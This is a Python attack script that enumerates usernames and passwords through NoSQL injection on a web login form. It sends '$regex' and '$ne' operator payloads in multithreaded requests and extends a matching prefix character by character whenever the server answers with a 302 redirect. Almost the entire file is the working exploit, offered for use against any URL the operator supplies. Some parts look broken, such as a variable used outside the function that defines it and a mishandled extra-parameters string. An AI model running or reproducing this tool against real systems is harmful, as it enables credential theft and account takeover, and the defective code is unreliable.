#!/usr/bin/python3
import string
import requests
import argparse
import sys
import concurrent.futures
from colorama import Fore
from urllib3.util import Retry
from requests.adapters import HTTPAdapter

def get_arguments():
    parser = argparse.ArgumentParser(description="NoSQL Injection User and Password Enumerator")
    parser.add_argument("-u", required=True, metavar="URL", help="Form submission url. Eg: http://example.com/index.php")
    parser.add_argument("-up", required=True, metavar="parameter", help="Parameter name of the username. Eg: username, user")
    parser.add_argument("-pp", required=True, metavar="parameter", help="Parameter name of the password. Eg: password, pass")
    parser.add_argument("-op", metavar="parameters", help="Other parameters with the values. Separate each parameter with a comma(,). Eg: login:Login, submit:Submit")
    parser.add_argument("-ep", required=True, metavar="parameter", help="Parameter that need to enumerate. Eg: username, password")
    parser.add_argument("-m", metavar="Method", help="Method of the form. Eg: GET/POST")
    return parser.parse_args()

def print_help_and_exit(parser):
    print(parser.print_help(sys.stderr))
    print(Fore.YELLOW + "\nExample: python " + sys.argv[0] + " -u http://example.com/index.php -up username -pp password -ep username -op login:login,submit:submit -m POST")
    sys.exit(1)

def get_method(args):
    # Updated method to handle the -m argument correctly
    if args.m:
        method = args.m.upper()  # Convert to uppercase to ensure valid HTTP method
        if method not in ['GET', 'POST']:
            print(Fore.RED + "Invalid method. Only 'GET' and 'POST' are supported.")
            sys.exit(1)
    else:
        method = 'POST'  # Default to POST if -m argument is not provided
    return method

def build_payloads(characters):
    return [firstChar + char for firstChar in characters for char in characters]

def process_payload(payload, url, method, enum_parameter, password_parameter, other_parameters, session):
    para = {enum_parameter + '[$regex]': "^" + payload + ".*", password_parameter + '[$ne]': '1' + other_parameters}
    try:
        r = session.request(method=method, url=url, data=para, allow_redirects=False, timeout=10)
        r.raise_for_status()

        if r.status_code == 302:
            loop = True
            userpass = payload
            while loop:
                loop = False
                for char in characters:
                    new_payload = userpass + char
                    para = {enum_parameter + '[$regex]': "^" + new_payload + ".*", password_parameter + '[$ne]': '1' + other_parameters}
                    try:
                        r = session.request(method=method, url=url, data=para, timeout=10)
                        r.raise_for_status()
                        if r.status_code == 302:
                            userpass = new_payload
                            loop = True
                    except requests.exceptions.RequestException as e:
                        print(Fore.RED + "Error occurred during request:", e)
                        break
            return userpass
    except requests.exceptions.RequestException as e:
        print(Fore.RED + "Error occurred during request:", e)

def main():
    args = get_arguments()
    method = get_method(args)
    if len(sys.argv) == 1:
        print_help_and_exit(args)

    url = args.u
    username_parameter = args.up
    password_parameter = args.pp
    enum_parameter = args.ep
    other_parameters = "," + args.op if args.op else ""

    characters = ''.join(c for c in string.printable if c not in "$^&*|.+\?")
    payloads = build_payloads(characters)

    retry = Retry(total=5, backoff_factor=0.5, status_forcelist=[500, 502, 503, 504])
    session = requests.Session()
    adapter = HTTPAdapter(max_retries=retry)
    session.mount('http://', adapter)

    final_output = []

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        results = []
        for payload in payloads:
            results.append(executor.submit(process_payload, payload, url, method, enum_parameter, password_parameter, other_parameters, session))
        
        for future in concurrent.futures.as_completed(results):
            userpass = future.result()
            if userpass:
                if userpass not in final_output:
                    print(Fore.GREEN + f"{enum_parameter} found: {userpass}")
                    final_output.append(userpass)

    if not final_output:
        print(Fore.RED + f"No {enum_parameter} found")
    else:
        print(f"\n{len(final_output)} {enum_parameter}(s) found:")
        print(Fore.RED + "\n".join(final_output))

if __name__ == "__main__":
    main()

